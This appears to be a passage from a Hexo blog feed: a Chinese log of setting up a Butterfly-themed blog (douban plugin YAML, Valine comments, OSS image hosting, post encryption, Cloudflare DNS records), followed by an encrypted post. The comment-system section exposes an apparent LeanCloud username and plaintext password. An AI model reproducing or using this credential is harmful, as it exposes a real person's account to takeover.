failed</span><br></pre></td></tr></table></figure><h3 id="自定义404页面"><a href="#自定义404页面" class="headerlink" title="自定义404页面"></a>自定义404页面</h3><blockquote><p>添加404模板，跳过渲染，教程来源<a href="https://www.cnblogs.com/MoYu-zc/p/14395965.html">https://www.cnblogs.com/MoYu-zc/p/14395965.html</a><br>主目录中跳过渲染，主题目录中关闭默认404<br>404模板：<a href="https://404.life/">https://404.life/</a></p></blockquote><h3 id="嵌入MyCSS-MyJs"><a href="#嵌入MyCSS-MyJs" class="headerlink" title="嵌入MyCSS   MyJs"></a>嵌入MyCSS   MyJs</h3><p>引入鼠标特效myjs.js<br>修改滚动条 mycss.css</p><h3 id="嵌入pixiv模块"><a href="#嵌入pixiv模块" class="headerlink" title="嵌入pixiv模块"></a>嵌入pixiv模块</h3><blockquote><p> pixiv每日 top50教程与友链发现<br>    <a href="https://chocolate.blog.csdn.net/article/details/105619812">https://chocolate.blog.csdn.net/article/details/105619812</a></p></blockquote><h3 id="添加douban模块"><a href="#添加douban模块" class="headerlink" title="添加douban模块"></a>添加douban模块</h3><blockquote><p>豆瓣电影插件教程参考<br>    <a href="https://github.com/mythsman/hexo-douban">https://github.com/mythsman/hexo-douban</a><br>    报错: INFO 0 books have been loaded in 3066 ms, because you are offline or your network is bad<br>    解决方案:使用nvm切换nodejs版本到12.18</p><p>有个bug是无法获取movie的内容，待解决。另外top_img被douban生成的movies覆盖。</p></blockquote><p>豆瓣需要在博客的配置文件中添加插件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">douban:</span></span><br><span class="line">  <span class="attr">user:</span> <span class="number">209077762</span> <span class="comment">#我的豆瓣ID</span></span><br><span class="line">  <span class="attr">builtin:</span> <span class="literal">true</span> <span class="comment"># 是否将生成页面的功能嵌入hexo s和hexo g中，默认是false,另一可选项为true(1.x.x版本新增配置项)。</span></span><br><span class="line">  <span class="comment"># book:</span></span><br><span class="line">  <span class="comment">#   title: &#x27;This is my book title&#x27;</span></span><br><span class="line">  <span class="comment">#   quote: &#x27;This is my book quote&#x27;</span></span><br><span class="line">  <span class="attr">movie:</span></span><br><span class="line">    <span class="attr">title:</span> <span class="string">&#x27;读万卷书，行万里路&#x27;</span></span><br><span class="line">    <span class="attr">quote:</span> <span class="string">&#x27;没有无限的因素在里面,你才是那个无限的因素的主导。——《海上钢琴师》&#x27;</span></span><br><span class="line">  <span class="comment"># game:</span></span><br><span class="line">  <span class="comment">#   title: &#x27;This is my game title&#x27;</span></span><br><span class="line">  <span class="comment">#   quote: &#x27;This is my game quote&#x27;</span></span><br><span class="line">  <span class="attr">timeout:</span> <span class="number">10000</span> <span class="comment">#爬取数据的超时时间，默认是 10000ms ,如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。</span></span><br></pre></td></tr></table></figure><h3 id="添加aplayer音乐模块"><a href="#添加aplayer音乐模块" class="headerlink" title="添加aplayer音乐模块"></a>添加aplayer音乐模块</h3><p> 使用的QQ音乐，qq音乐按照id来标识你的歌单列表，但有时会有bug，比如周杰伦的歌曲变成别人的歌曲</p><blockquote><p>aplayer参考官方教程配置</p></blockquote><h3 id="搭建双评论系统"><a href="#搭建双评论系统" class="headerlink" title="搭建双评论系统"></a>搭建双评论系统</h3><p>评论模块Disqus：<br>    参考教程: <a href="https://blog.csdn.net/qq_38157825/article/details/112783083">https://blog.csdn.net/qq_38157825/article/details/112783083</a><br>    要实名，弃用：LeanCloud:liloker,    mm:fkmwpCKp5jpiphD  ,@163.com<br>    Disqus:被墙。。。。。。<br>    使用gittalk:教程<a href="https://blog.csdn.net/qq_33384402/article/details/107200465">https://blog.csdn.net/qq_33384402/article/details/107200465</a><br>    算了，还是用第一个valine吧，gittalk需要登录才能评论，这得减少不少活跃度，<a href="https://blog.csdn.net/qq_38157825/article/details/112783083">https://blog.csdn.net/qq_38157825/article/details/112783083</a><br>    邮箱提醒:IMAP/SMTP授权码163邮箱:<br>    教程:<a href="https://github.com/zhaojun1998/Valine-Admin">https://github.com/zhaojun1998/Valine-Admin</a><br>    折腾半天，leancloud好坑，由于域名没有备案，所以无法用leancloud的域名绑定，所以就没法接邮箱了，缺点就是无法及时收到评论提醒，暂时不管了。。。</p><hr><p>5月13日补充</p><p>今天deploy一下，居然，评论系统生效了，赶紧来总结一下这个误打误撞的幸运</p><p>用的valine，登录Leancloud，发现上次只是根据邮件那篇教程，弄失败了，只是建了容器啥的。</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210513235835695.png" alt="image-20210513235835695"></p><p>创建应用</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210514000452921.png" alt="image-20210514000452921"></p><p>云引擎未部署，当时是为了部署邮件提醒来着</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210514000547119.png" alt="image-20210514000547119"></p><p>然后把应用api的id和key接给主题配置文件中的对应位置的appid和appkey，评论系统选用valine</p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210514001006737.png" alt="image-20210514001006737"></p><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20210514001032285.png" alt="image-20210514001032285"></p><p>另外，博客的配置文件中不需要添加插件valine，哦不用，valine有主题内置的部分，豆瓣是需要的</p><h3 id="添加看板娘live2D与头像特效改变"><a href="#添加看板娘live2D与头像特效改变" class="headerlink" title="添加看板娘live2D与头像特效改变"></a>添加看板娘live2D与头像特效改变</h3><blockquote><p>头像，添加live2D<br>    教程：<a href="https://www.jianshu.com/p/f054333ac9e6">https://www.jianshu.com/p/f054333ac9e6</a></p><pre><code>大佬博客:https://www.fghrsh.net/about.html    学习写后端看板娘API，需要php语言支持，参考上面大佬博客与github:    https://github.com/fghrsh/live2d_api大佬二:https://github.com/stevenjoezhang/live2d-widget</code></pre></blockquote><h3 id="自建OSS图床来添加照片墙，顺便添加typora自动上传图片功能"><a href="#自建OSS图床来添加照片墙，顺便添加typora自动上传图片功能" class="headerlink" title="自建OSS图床来添加照片墙，顺便添加typora自动上传图片功能"></a>自建OSS图床来添加照片墙，顺便添加typora自动上传图片功能</h3><blockquote><p>关于相册集<br>    参考官方文档<br>    大量图片面编译成静态文件节省时间教程：<br>    <a href="https://www.cnblogs.com/xljzlw/p/5137622.html">https://www.cnblogs.com/xljzlw/p/5137622.html</a></p></blockquote><pre><code>未采用上述链接使用typora图片上传至阿里云OSS，使用picgo-core命令行，用户命令使用git bash在typora中打开，命令行安装。 参考教程：Typora使用技巧之插入图片及图片上传 - 王虾片的文章 - 知乎https://zhuanlan.zhihu.com/p/344941041</code></pre><blockquote><p>OSS需要使用子账户 AccessKey<br>    教程<a href="https://blog.csdn.net/oneby1314/article/details/107311775">https://blog.csdn.net/oneby1314/article/details/107311775</a></p></blockquote><h3 id="SEO优化"><a href="#SEO优化" class="headerlink" title="SEO优化"></a>SEO优化</h3><blockquote><p>谷歌百度收录<br>    <a href="https://blog.csdn.net/weixin_43350051/article/details/104923503">https://blog.csdn.net/weixin_43350051/article/details/104923503</a><br>国内托管网站coding上的部署：<br>    <a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">https://blog.csdn.net/sinat_37781304/article/details/82729029</a></p><p>这一步暂时还没做，暂时不做了</p></blockquote><h3 id="使用文章加密"><a href="#使用文章加密" class="headerlink" title="使用文章加密"></a>使用文章加密</h3><blockquote><p>文章加密插件<br>    教程:<a href="https://blog.csdn.net/weixin_45750972/article/details/111396124">https://blog.csdn.net/weixin_45750972/article/details/111396124</a><br>    <a href="https://zhuanlan.zhihu.com/p/113235573">https://zhuanlan.zhihu.com/p/113235573</a></p></blockquote><p><img src="https://imgbed4iloker.oss-cn-hangzhou.aliyuncs.com/Typora-img/image-20230308153834764.png" alt="image-20230308153834764"></p><p><a href="https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md">https://github.com/D0n9X1n/hexo-blog-encrypt/blob/master/ReadMe.zh.md</a> 加密插件项目</p><ul><li>所有的核心功能都是由原生的 API 所提供的. 在 Node.js中, 我们使用 <a href="https://nodejs.org/dist/latest-v12.x/docs/api/crypto.html">Crypto</a>. 在浏览器中, 我们使用 <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API">Web Crypto API</a>.</li><li><a href="https://tools.ietf.org/html/rfc2898">PBKDF2</a>, <a href="https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.180-4.pdf">SHA256</a> 被用于分发密钥, <a href="https://csrc.nist.gov/publications/detail/sp/800-38a/final">AES256-CBC</a> 被用于加解密, 我们还使用 <a href="https://csrc.nist.gov/csrc/media/publications/fips/198/1/final/documents/fips-198-1_final.pdf">HMAC</a> 来验证密文的来源, 并确保其未被篡改.</li><li>我们广泛地使用 Promise 来进行异步操作, 以此确保线程不被阻塞</li></ul><hr><h3 id="git使用"><a href="#git使用" class="headerlink" title="git使用"></a>git使用</h3><blockquote><p> git学习：<a href="https://www.liaoxuefeng.com/wiki/896043488029600">https://www.liaoxuefeng.com/wiki/896043488029600</a></p></blockquote><h3 id="友链修改"><a href="#友链修改" class="headerlink" title="友链修改"></a>友链修改</h3><blockquote><p>友链:样式js修改:<a href="https://blog.csdn.net/u012208219/article/details/106883001">https://blog.csdn.net/u012208219/article/details/106883001</a></p><p>未采纳</p></blockquote><h3 id="使用CDN"><a href="#使用CDN" class="headerlink" title="使用CDN"></a>使用CDN</h3><p>我采用的方案是：github代码托管+namecheap域名+cloudflare全球加速分发</p><p>域名是从namecheap申请的，赠送一年的whois隐藏和ssl证书，</p><p>namecheap中，将namecheap basicDNS切换成自定义DNS，然后填上cloudflare自动给你的两个NS服务器域名，意思是吧域名的DNS解析的工作丢给cloudflare这家的域名解析服务器来做，此时，namecheap这家已经不负责你的DNS解析了，所以advanceDNS模块就无了。</p><p>github启用自定义域名之后会在你的静态文件列表中自动生成一个CNAME的文件，里面是你自己申请的域名</p><p>cloudflare进去后邮箱和密码注册，引导你添加站点域名，填入自己在namecheap申请的域名即可，可能会提示你未添加A记录什么的，那是因为namecheap此时已经不管你域名的DNS解析工作了，DNS解析工作由cloudflare来做，点击面板左边的DNS，将cloudflare中的解析写成和你namecheap中原本的一模一样的即可，然后等个10分钟左右这样，就行了。</p><p>免费版的cloudflare国内国外都有节点，速度还可以，比之前纯粹的github可能还快一点。</p><p>关于DNS的设置我是这样</p><table><thead><tr><th>** A**</th><th>w4xiaoyao.top</th><th>185.199.111.153</th><th><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDQgMzkuNSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM5OTk7fS5jbHMtMntmaWxsOiNmNjhhMWQ7fS5jbHMtM3tmaWxsOiNmZmY7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5Bc3NldCAxPC90aXRsZT48ZyBpZD0iTGF5ZXJfMiIgZGF0YS1uYW1lPSJMYXllciAyIj48ZyBpZD0iTGF5ZXJfMS0yIiBkYXRhLW5hbWU9IkxheWVyIDEiPjxwb2x5Z29uIGNsYXNzPSJjbHMtMSIgcG9pbnRzPSIxMDQgMjAuMTIgOTQgMTAuNjIgOTQgMTYuMTIgMCAxNi4xMiAwIDI0LjEyIDk0IDI0LjEyIDk0IDI5LjYyIDEwNCAyMC4xMiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTc0LjUsMzljLTIuMDgsMC0xNS40My0uMTMtMjguMzQtLjI1LTEyLjYyLS4xMi0yNS42OC0uMjUtMjcuNjYtLjI1YTgsOCwwLDAsMS0xLTE1LjkzYzAtLjE5LDAtLjM4LDAtLjU3YTkuNDksOS40OSwwLDAsMSwxNC45LTcuODEsMTkuNDgsMTkuNDgsMCwwLDEsMzguMDUsNC42M0ExMC41LDEwLjUsMCwxLDEsNzQuNSwzOVoiLz48cGF0aCBjbGFzcz0iY2xzLTMiIGQ9Ik01MSwxQTE5LDE5LDAsMCwxLDcwLDE5LjU5LDEwLDEwLDAsMSwxLDc0LjUsMzguNWMtNC4xMSwwLTUyLS41LTU2LS41YTcuNSw3LjUsMCwwLDEtLjQ0LTE1QTguNDcsOC40NywwLDAsMSwxOCwyMmE5LDksMCwwLDEsMTQuNjgtN0ExOSwxOSwwLDAsMSw1MSwxbTAtMUEyMCwyMCwwLDAsMCwzMi4xMywxMy40MiwxMCwxMCwwLDAsMCwxNywyMnYuMTRBOC41LDguNSwwLDAsMCwxOC41LDM5YzIsMCwxNSwuMTMsMjcuNjYuMjUsMTIuOTEuMTIsMjYuMjYuMjUsMjguMzQuMjVhMTEsMTEsMCwxLDAtMy42MS0yMS4zOUEyMC4xLDIwLjEsMCwwLDAsNTEsMFoiLz48L2c+PC9nPjwvc3ZnPg==" alt="img">已代理</th><th>自动</th><th>编辑切换到打开状态时，将在此行下方额外添加一个表行来支持编辑 DNS 记录。</th><th></th></tr></thead><tbody><tr><td></td><td><strong>A</strong></td><td>w4xiaoyao.top</td><td>185.199.110.153</td><td><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDQgMzkuNSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM5OTk7fS5jbHMtMntmaWxsOiNmNjhhMWQ7fS5jbHMtM3tmaWxsOiNmZmY7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5Bc3NldCAxPC90aXRsZT48ZyBpZD0iTGF5ZXJfMiIgZGF0YS1uYW1lPSJMYXllciAyIj48ZyBpZD0iTGF5ZXJfMS0yIiBkYXRhLW5hbWU9IkxheWVyIDEiPjxwb2x5Z29uIGNsYXNzPSJjbHMtMSIgcG9pbnRzPSIxMDQgMjAuMTIgOTQgMTAuNjIgOTQgMTYuMTIgMCAxNi4xMiAwIDI0LjEyIDk0IDI0LjEyIDk0IDI5LjYyIDEwNCAyMC4xMiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTc0LjUsMzljLTIuMDgsMC0xNS40My0uMTMtMjguMzQtLjI1LTEyLjYyLS4xMi0yNS42OC0uMjUtMjcuNjYtLjI1YTgsOCwwLDAsMS0xLTE1LjkzYzAtLjE5LDAtLjM4LDAtLjU3YTkuNDksOS40OSwwLDAsMSwxNC45LTcuODEsMTkuNDgsMTkuNDgsMCwwLDEsMzguMDUsNC42M0ExMC41LDEwLjUsMCwxLDEsNzQuNSwzOVoiLz48cGF0aCBjbGFzcz0iY2xzLTMiIGQ9Ik01MSwxQTE5LDE5LDAsMCwxLDcwLDE5LjU5LDEwLDEwLDAsMSwxLDc0LjUsMzguNWMtNC4xMSwwLTUyLS41LTU2LS41YTcuNSw3LjUsMCwwLDEtLjQ0LTE1QTguNDcsOC40NywwLDAsMSwxOCwyMmE5LDksMCwwLDEsMTQuNjgtN0ExOSwxOSwwLDAsMSw1MSwxbTAtMUEyMCwyMCwwLDAsMCwzMi4xMywxMy40MiwxMCwxMCwwLDAsMCwxNywyMnYuMTRBOC41LDguNSwwLDAsMCwxOC41LDM5YzIsMCwxNSwuMTMsMjcuNjYuMjUsMTIuOTEuMTIsMjYuMjYuMjUsMjguMzQuMjVhMTEsMTEsMCwxLDAtMy42MS0yMS4zOUEyMC4xLDIwLjEsMCwwLDAsNTEsMFoiLz48L2c+PC9nPjwvc3ZnPg==" alt="img">已代理</td><td>自动</td><td>编辑切换到打开状态时，将在此行下方额外添加一个表行来支持编辑 DNS 记录。</td></tr><tr><td></td><td><strong>A</strong></td><td>w4xiaoyao.top</td><td>185.199.109.153</td><td><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDQgMzkuNSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM5OTk7fS5jbHMtMntmaWxsOiNmNjhhMWQ7fS5jbHMtM3tmaWxsOiNmZmY7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5Bc3NldCAxPC90aXRsZT48ZyBpZD0iTGF5ZXJfMiIgZGF0YS1uYW1lPSJMYXllciAyIj48ZyBpZD0iTGF5ZXJfMS0yIiBkYXRhLW5hbWU9IkxheWVyIDEiPjxwb2x5Z29uIGNsYXNzPSJjbHMtMSIgcG9pbnRzPSIxMDQgMjAuMTIgOTQgMTAuNjIgOTQgMTYuMTIgMCAxNi4xMiAwIDI0LjEyIDk0IDI0LjEyIDk0IDI5LjYyIDEwNCAyMC4xMiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTc0LjUsMzljLTIuMDgsMC0xNS40My0uMTMtMjguMzQtLjI1LTEyLjYyLS4xMi0yNS42OC0uMjUtMjcuNjYtLjI1YTgsOCwwLDAsMS0xLTE1LjkzYzAtLjE5LDAtLjM4LDAtLjU3YTkuNDksOS40OSwwLDAsMSwxNC45LTcuODEsMTkuNDgsMTkuNDgsMCwwLDEsMzguMDUsNC42M0ExMC41LDEwLjUsMCwxLDEsNzQuNSwzOVoiLz48cGF0aCBjbGFzcz0iY2xzLTMiIGQ9Ik01MSwxQTE5LDE5LDAsMCwxLDcwLDE5LjU5LDEwLDEwLDAsMSwxLDc0LjUsMzguNWMtNC4xMSwwLTUyLS41LTU2LS41YTcuNSw3LjUsMCwwLDEtLjQ0LTE1QTguNDcsOC40NywwLDAsMSwxOCwyMmE5LDksMCwwLDEsMTQuNjgtN0ExOSwxOSwwLDAsMSw1MSwxbTAtMUEyMCwyMCwwLDAsMCwzMi4xMywxMy40MiwxMCwxMCwwLDAsMCwxNywyMnYuMTRBOC41LDguNSwwLDAsMCwxOC41LDM5YzIsMCwxNSwuMTMsMjcuNjYuMjUsMTIuOTEuMTIsMjYuMjYuMjUsMjguMzQuMjVhMTEsMTEsMCwxLDAtMy42MS0yMS4zOUEyMC4xLDIwLjEsMCwwLDAsNTEsMFoiLz48L2c+PC9nPjwvc3ZnPg==" alt="img">已代理</td><td>自动</td><td>编辑切换到打开状态时，将在此行下方额外添加一个表行来支持编辑 DNS 记录。</td></tr><tr><td></td><td><strong>A</strong></td><td>w4xiaoyao.top</td><td>185.199.108.153</td><td><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDQgMzkuNSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM5OTk7fS5jbHMtMntmaWxsOiNmNjhhMWQ7fS5jbHMtM3tmaWxsOiNmZmY7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5Bc3NldCAxPC90aXRsZT48ZyBpZD0iTGF5ZXJfMiIgZGF0YS1uYW1lPSJMYXllciAyIj48ZyBpZD0iTGF5ZXJfMS0yIiBkYXRhLW5hbWU9IkxheWVyIDEiPjxwb2x5Z29uIGNsYXNzPSJjbHMtMSIgcG9pbnRzPSIxMDQgMjAuMTIgOTQgMTAuNjIgOTQgMTYuMTIgMCAxNi4xMiAwIDI0LjEyIDk0IDI0LjEyIDk0IDI5LjYyIDEwNCAyMC4xMiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTc0LjUsMzljLTIuMDgsMC0xNS40My0uMTMtMjguMzQtLjI1LTEyLjYyLS4xMi0yNS42OC0uMjUtMjcuNjYtLjI1YTgsOCwwLDAsMS0xLTE1LjkzYzAtLjE5LDAtLjM4LDAtLjU3YTkuNDksOS40OSwwLDAsMSwxNC45LTcuODEsMTkuNDgsMTkuNDgsMCwwLDEsMzguMDUsNC42M0ExMC41LDEwLjUsMCwxLDEsNzQuNSwzOVoiLz48cGF0aCBjbGFzcz0iY2xzLTMiIGQ9Ik01MSwxQTE5LDE5LDAsMCwxLDcwLDE5LjU5LDEwLDEwLDAsMSwxLDc0LjUsMzguNWMtNC4xMSwwLTUyLS41LTU2LS41YTcuNSw3LjUsMCwwLDEtLjQ0LTE1QTguNDcsOC40NywwLDAsMSwxOCwyMmE5LDksMCwwLDEsMTQuNjgtN0ExOSwxOSwwLDAsMSw1MSwxbTAtMUEyMCwyMCwwLDAsMCwzMi4xMywxMy40MiwxMCwxMCwwLDAsMCwxNywyMnYuMTRBOC41LDguNSwwLDAsMCwxOC41LDM5YzIsMCwxNSwuMTMsMjcuNjYuMjUsMTIuOTEuMTIsMjYuMjYuMjUsMjguMzQuMjVhMTEsMTEsMCwxLDAtMy42MS0yMS4zOUEyMC4xLDIwLjEsMCwwLDAsNTEsMFoiLz48L2c+PC9nPjwvc3ZnPg==" alt="img">已代理</td><td>自动</td><td>编辑切换到打开状态时，将在此行下方额外添加一个表行来支持编辑 DNS 记录。</td></tr><tr><td></td><td><strong>A</strong></td><td>w4xiaoyao.top</td><td>192.30.252.154</td><td><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDQgMzkuNSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM5OTk7fS5jbHMtMntmaWxsOiNmNjhhMWQ7fS5jbHMtM3tmaWxsOiNmZmY7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5Bc3NldCAxPC90aXRsZT48ZyBpZD0iTGF5ZXJfMiIgZGF0YS1uYW1lPSJMYXllciAyIj48ZyBpZD0iTGF5ZXJfMS0yIiBkYXRhLW5hbWU9IkxheWVyIDEiPjxwb2x5Z29uIGNsYXNzPSJjbHMtMSIgcG9pbnRzPSIxMDQgMjAuMTIgOTQgMTAuNjIgOTQgMTYuMTIgMCAxNi4xMiAwIDI0LjEyIDk0IDI0LjEyIDk0IDI5LjYyIDEwNCAyMC4xMiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTc0LjUsMzljLTIuMDgsMC0xNS40My0uMTMtMjguMzQtLjI1LTEyLjYyLS4xMi0yNS42OC0uMjUtMjcuNjYtLjI1YTgsOCwwLDAsMS0xLTE1LjkzYzAtLjE5LDAtLjM4LDAtLjU3YTkuNDksOS40OSwwLDAsMSwxNC45LTcuODEsMTkuNDgsMTkuNDgsMCwwLDEsMzguMDUsNC42M0ExMC41LDEwLjUsMCwxLDEsNzQuNSwzOVoiLz48cGF0aCBjbGFzcz0iY2xzLTMiIGQ9Ik01MSwxQTE5LDE5LDAsMCwxLDcwLDE5LjU5LDEwLDEwLDAsMSwxLDc0LjUsMzguNWMtNC4xMSwwLTUyLS41LTU2LS41YTcuNSw3LjUsMCwwLDEtLjQ0LTE1QTguNDcsOC40NywwLDAsMSwxOCwyMmE5LDksMCwwLDEsMTQuNjgtN0ExOSwxOSwwLDAsMSw1MSwxbTAtMUEyMCwyMCwwLDAsMCwzMi4xMywxMy40MiwxMCwxMCwwLDAsMCwxNywyMnYuMTRBOC41LDguNSwwLDAsMCwxOC41LDM5YzIsMCwxNSwuMTMsMjcuNjYuMjUsMTIuOTEuMTIsMjYuMjYuMjUsMjguMzQuMjVhMTEsMTEsMCwxLDAtMy42MS0yMS4zOUEyMC4xLDIwLjEsMCwwLDAsNTEsMFoiLz48L2c+PC9nPjwvc3ZnPg==" alt="img">已代理</td><td>自动</td><td>编辑切换到打开状态时，将在此行下方额外添加一个表行来支持编辑 DNS 记录。</td></tr><tr><td></td><td><strong>A</strong></td><td>www</td><td>192.30.252.154</td><td><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAxMDQgMzkuNSI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiM5OTk7fS5jbHMtMntmaWxsOiNmNjhhMWQ7fS5jbHMtM3tmaWxsOiNmZmY7fTwvc3R5bGU+PC9kZWZzPjx0aXRsZT5Bc3NldCAxPC90aXRsZT48ZyBpZD0iTGF5ZXJfMiIgZGF0YS1uYW1lPSJMYXllciAyIj48ZyBpZD0iTGF5ZXJfMS0yIiBkYXRhLW5hbWU9IkxheWVyIDEiPjxwb2x5Z29uIGNsYXNzPSJjbHMtMSIgcG9pbnRzPSIxMDQgMjAuMTIgOTQgMTAuNjIgOTQgMTYuMTIgMCAxNi4xMiAwIDI0LjEyIDk0IDI0LjEyIDk0IDI5LjYyIDEwNCAyMC4xMiIvPjxwYXRoIGNsYXNzPSJjbHMtMiIgZD0iTTc0LjUsMzljLTIuMDgsMC0xNS40My0uMTMtMjguMzQtLjI1LTEyLjYyLS4xMi0yNS42OC0uMjUtMjcuNjYtLjI1YTgsOCwwLDAsMS0xLTE1LjkzYzAtLjE5LDAtLjM4LDAtLjU3YTkuNDksOS40OSwwLDAsMSwxNC45LTcuODEsMTkuNDgsMTkuNDgsMCwwLDEsMzguMDUsNC42M0ExMC41LDEwLjUsMCwxLDEsNzQuNSwzOVoiLz48cGF0aCBjbGFzcz0iY2xzLTMiIGQ9Ik01MSwxQTE5LDE5LDAsMCwxLDcwLDE5LjU5LDEwLDEwLDAsMSwxLDc0LjUsMzguNWMtNC4xMSwwLTUyLS41LTU2LS41YTcuNSw3LjUsMCwwLDEtLjQ0LTE1QTguNDcsOC40NywwLDAsMSwxOCwyMmE5LDksMCwwLDEsMTQuNjgtN0ExOSwxOSwwLDAsMSw1MSwxbTAtMUEyMCwyMCwwLDAsMCwzMi4xMywxMy40MiwxMCwxMCwwLDAsMCwxNywyMnYuMTRBOC41LDguNSwwLDAsMCwxOC41LDM5YzIsMCwxNSwuMTMsMjcuNjYuMjUsMTIuOTEuMTIsMjYuMjYuMjUsMjguMzQuMjVhMTEsMTEsMCwxLDAtMy42MS0yMS4zOUEyMC4xLDIwLjEsMCwwLDAsNTEsMFoiLz48L2c+PC9nPjwvc3ZnPg==" alt="img">已代理</td><td>自动</td><td></td></tr></tbody></table><p>原理上只填最后两行也能管用，但是填了前四个好像更快一些，具体原因未查</p><h3 id="gulp压缩PWA优化"><a href="#gulp压缩PWA优化" class="headerlink" title="gulp压缩PWA优化"></a>gulp压缩PWA优化</h3><blockquote><p>参考教程官方文档:<a href="https://butterfly.js.org/posts/4073eda/#jQuery-%E5%8A%A0%E8%BC%89">https://butterfly.js.org/posts/4073eda/#jQuery-%E5%8A%A0%E8%BC%89</a></p></blockquote><h3 id="访客地图模块"><a href="#访客地图模块" class="headerlink" title="访客地图模块"></a>访客地图模块</h3><blockquote><p>参考官方教程：<a href="https://butterfly.js.org/posts/ea33ab97/#%E6%A0%BC%E5%BC%8F">https://butterfly.js.org/posts/ea33ab97/#%E6%A0%BC%E5%BC%8F</a></p></blockquote><h3 id="改变字体"><a href="#改变字体" class="headerlink" title="改变字体"></a>改变字体</h3><blockquote><p>参考教程:<a href="https://blog.csdn.net/m0_46296826/article/details/115350456">https://blog.csdn.net/m0_46296826/article/details/115350456</a><br>还关于宝塔面板的<a href="https://www.matemaster.cn/posts/52745.html">https://www.matemaster.cn/posts/52745.html</a></p></blockquote><h3 id="主页隐藏指定文章"><a href="#主页隐藏指定文章" class="headerlink" title="主页隐藏指定文章"></a>主页隐藏指定文章</h3><blockquote><p>参考教程:<a href="https://blog.zhheo.com/p/451ff5e9.html">https://blog.zhheo.com/p/451ff5e9.html</a></p><p><a href="https://hexo.io/docs/one-command-deployment.html">https://hexo.io/docs/one-command-deployment.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 折腾吧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>幸存者偏差与可惜</title>
      <link href="2021/05/21/7Rationality3Sensibility/Sensibility/%E5%B9%B8%E5%AD%98%E8%80%85%E5%81%8F%E5%B7%AE%E4%B8%8E%E5%8F%AF%E6%83%9C/"/>
      <url>2021/05/21/7Rationality3Sensibility/Sensibility/%E5%B9%B8%E5%AD%98%E8%80%85%E5%81%8F%E5%B7%AE%E4%B8%8E%E5%8F%AF%E6%83%9C/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="9697f0c49862c23c3c5d5f446b2cd2e6b2d2fd4ed579b425fb163d05a4180dab">c05db5c9326e1a204d18d71a654b071f4a0c98ddba835983d83af0dfc14cfdcc571a296f12a68ccf05949f8889bb7008359176741013a306879240247b9e4d65fbb3666c837a57d4d1ef6a954290f84ab1f6d52860061f05e49e945a6f65ea76deeb1f424e7d93c82881c7932dde58aa45f37113ca785d2c0f55fc11024191d9ce7029b011c575baada180d45da1798075ea9677b417c6c2f565997f1977f57b9ce2ef5d452dbfc6d460a41aac6bb2c9664ec0c518fbe1c80c301d9fea096442c73215b7033997a75b8a54a53fe4b042c2b1b205a333800e60623dfeb3bb4542a273e739e1ef2c03f976690181de61a274bce692c722a68f2908078e1e87daf4541f8d9221c4c1099a79a5e7db45debc92ca2f9e301e5e4168d1c093aa3404fc5f153b2a1d0659925d50b7442f67ddd8b59d7feee67571fd39d23d3bfc8d06f0ff91c087ae7d1da83860239424fd0c2464f92bc84aff1c8cb05bbe745b2430bdd9217a57185cbb3218f